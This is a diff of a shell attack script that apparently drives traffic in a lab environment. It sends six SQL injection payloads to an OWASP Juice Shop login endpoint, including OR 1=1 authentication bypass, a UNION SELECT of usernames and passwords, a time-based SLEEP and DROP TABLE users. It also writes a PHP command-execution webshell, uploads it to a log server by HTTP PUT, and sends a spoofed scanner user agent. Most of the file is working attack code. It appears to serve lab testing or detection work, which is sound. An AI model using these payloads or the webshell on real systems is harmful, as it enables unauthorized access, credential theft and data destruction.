@@ -1,111 +1,112 @@
 #!/bin/sh
-# attacks/run_attacks.sh (SQLi variants + upload + UA)
-# - Send multiple SQL Injection payloads to Juice Shop login endpoint
-# - Upload a PHP webshell to the log server upload endpoint
-# - Send request with suspicious User-Agent to log server
-# - Clean up temporary files
+# attacks/run_attacks.sh (improved logging)
+# Sends SQLi payloads, uploads webshell, issues UA request.
+# Produces concise, timestamped log lines.
 
 set -eu
 
-# ---- config ----
+# config
+SLEEP_BEFORE=8
 JUICE_HOST="http://juice:3000"
 SQLI_ENDPOINT="${JUICE_HOST}/rest/user/login"
 LOGSRV_UPLOAD_URL="http://logsrv:80/uploads"
 UA="Mozilla/5.0 (evil-scanner)"
-MAX_SNIPPET_BYTES=800
-WAIT_TIMEOUT=30
-# -----------------
+MAX_SNIPPET=200
+ATTACKER_LOG="/tmp/attacker_run.log"
+: > "${ATTACKER_LOG}"
 
-# ensure curl available
+timestamp() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
+
+log() {
+  printf "%s | %s\n" "$(timestamp)" "$1" >> "${ATTACKER_LOG}"
+  printf "%s | %s\n" "$(timestamp)" "$1"
+}
+
+# wait for juice shop to be reachable (max 60s)
+log "Waiting for Juice Shop (up to 60s)..."
+timeout=60
+elapsed=0
+while [ $elapsed -lt $timeout ]; do
+  HTTP=$(curl -sS -o /dev/null -w "%{http_code}" "${JUICE_HOST}/" || echo "000")
+  if [ "$HTTP" = "200" ] || [ "$HTTP" = "302" ]; then
+    log "Juice Shop reachable (HTTP ${HTTP})"
+    break
+  fi
+  sleep 2
+  elapsed=$((elapsed+2))
+  log "Waiting... (${elapsed}s)"
+done
+
+# ensure curl exists
 if ! command -v curl >/dev/null 2>&1; then
-  echo "[!] curl not found in PATH. Exiting."
+  log "[!] curl not found in PATH. Exiting."
   exit 0
 fi
 
-# wait for Juice Shop to be reachable
-START=$(date +%s)
-while true; do
-  if curl -sS --max-time 2 "${JUICE_HOST}/" >/dev/null 2>&1; then
-    echo "[*] Juice Shop reachable"
-    break
-  fi
-  NOW=$(date +%s)
-  if [ $((NOW - START)) -ge $WAIT_TIMEOUT ]; then
-    echo "[!] Timeout waiting for Juice Shop (continuing anyway)"
-    break
-  fi
-  echo "[*] Waiting for Juice Shop..."
-  sleep 1
-done
-
-echo "[*] Preparing SQLi payloads..."
+# prepare payloads
 i=0
-
-# payloads creation
-i=$((i+1))
-cat > /tmp/payload_${i}.json <<'EOF'
+i=$((i+1)); cat > /tmp/payload_${i}.json <<'EOF'
 {"email":"admin@example.com'"' OR 1=1 --","password":"x"}
 EOF
 
-i=$((i+1))
-cat > /tmp/payload_${i}.json <<'EOF'
+i=$((i+1)); cat > /tmp/payload_${i}.json <<'EOF'
 {"email":"admin@example.com OR 1=1","password":"x"}
 EOF
 
-i=$((i+1))
-cat > /tmp/payload_${i}.json <<'EOF'
+i=$((i+1)); cat > /tmp/payload_${i}.json <<'EOF'
 {"email":"admin' UNION SELECT username, password FROM Users --","password":"x"}
 EOF
 
-i=$((i+1))
-cat > /tmp/payload_${i}.json <<'EOF'
+i=$((i+1)); cat > /tmp/payload_${i}.json <<'EOF'
 {"email":"admin' OR SLEEP(5) --","password":"x"}
 EOF
 
-i=$((i+1))
-cat > /tmp/payload_${i}.json <<'EOF'
+i=$((i+1)); cat > /tmp/payload_${i}.json <<'EOF'
 {"email":"admin'; DROP TABLE users; --","password":"x"}
 EOF
 
-i=$((i+1))
-cat > /tmp/payload_${i}.json <<'EOF'
+i=$((i+1)); cat > /tmp/payload_${i}.json <<'EOF'
 {"email":"alice' -- ","password":"x"}
 EOF
 
 TOTAL=$i
-echo "[*] Prepared ${TOTAL} SQLi payloads."
+log "Prepared ${TOTAL} SQLi payloads."
 
-# send payloads
-for p in $(seq 1 $TOTAL); do
-  PAYLOAD_FILE="/tmp/payload_${p}.json"
-  RESP_FILE="/tmp/resp_${p}.txt"
-  echo "[*] Sending payload ${p}/${TOTAL} -> ${PAYLOAD_FILE}"
-  HTTP_CODE=$(curl -sS -o "${RESP_FILE}" -w "%{http_code}" -X POST -H "Content-Type: application/json" --data-binary @"${PAYLOAD_FILE}" "${SQLI_ENDPOINT}" || echo "000")
-  echo "[*] HTTP code: ${HTTP_CODE}"
-  echo "[*] Response snippet (first ${MAX_SNIPPET_BYTES} bytes):"
-  if [ -s "${RESP_FILE}" ]; then
-    head -c ${MAX_SNIPPET_BYTES} "${RESP_FILE}" || true
-    echo
+# send payloads with concise logging
+p=1
+while [ $p -le $TOTAL ]; do
+  PAY="/tmp/payload_${p}.json"
+  RESP="/tmp/resp_${p}.txt"
+  log "Sending payload ${p}/${TOTAL} -> ${PAY}"
+  HTTP=$(curl -sS -o "${RESP}" -w "%{http_code}" -X POST -H "Content-Type: application/json" --data-binary @"${PAY}" "${SQLI_ENDPOINT}" || echo "000")
+  # create snippet: strip tags and limit size
+  if [ -s "${RESP}" ]; then
+    SNIPPET=$(head -c ${MAX_SNIPPET} "${RESP}" | sed -E 's/<[^>]*>//g' | tr -d '\r\n')
   else
-    echo "(empty response body)"
+    SNIPPET="(empty)"
   fi
+  log "PAYLOAD ${p} | HTTP ${HTTP} | SNIPPET: ${SNIPPET}"
+  p=$((p+1))
 done
 
-# create webshell
+# upload webshell(s)
 TS="$(date +%s)"
 SHELL_NAME="shell_${TS}.php"
 TMP="/tmp/${SHELL_NAME}"
 echo "<?php system(\$_GET['cmd']); ?>" > "${TMP}"
-echo "[*] Created webshell ${TMP}"
+log "Created webshell ${TMP}"
 
-# upload webshell
-HTTP_CODE=$(curl -sS -o /tmp/upload_resp -w "%{http_code}" -X PUT --data-binary @"${TMP}" "${LOGSRV_UPLOAD_URL}/${SHELL_NAME}" || echo "000")
-echo "[*] Upload HTTP code: ${HTTP_CODE}"
+log "Uploading ${SHELL_NAME} to ${LOGSRV_UPLOAD_URL}/"
+UPLOAD_HTTP=$(curl -sS -o /tmp/upload_resp -w "%{http_code}" -X PUT --data-binary @"${TMP}" "${LOGSRV_UPLOAD_URL}/${SHELL_NAME}" || echo "000")
+log "Upload HTTP ${UPLOAD_HTTP} -> ${SHELL_NAME}"
 
-# suspicious UA request
+# suspicious UA
+log "Sending suspicious UA request..."
 curl -sS -A "${UA}" "${LOGSRV_UPLOAD_URL%/uploads/}" >/dev/null 2>&1 || true
 
-# cleanup
+# cleanup local tmp
 rm -f /tmp/payload_*.json /tmp/resp_*.txt /tmp/upload_resp "${TMP}" || true
+log "Cleaned temporary files. Attacks done. Uploaded: ${SHELL_NAME}"
 
-echo "[*] Attacks done. Uploaded: ${SHELL_NAME}"
+# print final location of log
+log "ATTACK LOG WRITTEN: ${ATTACKER_LOG}"
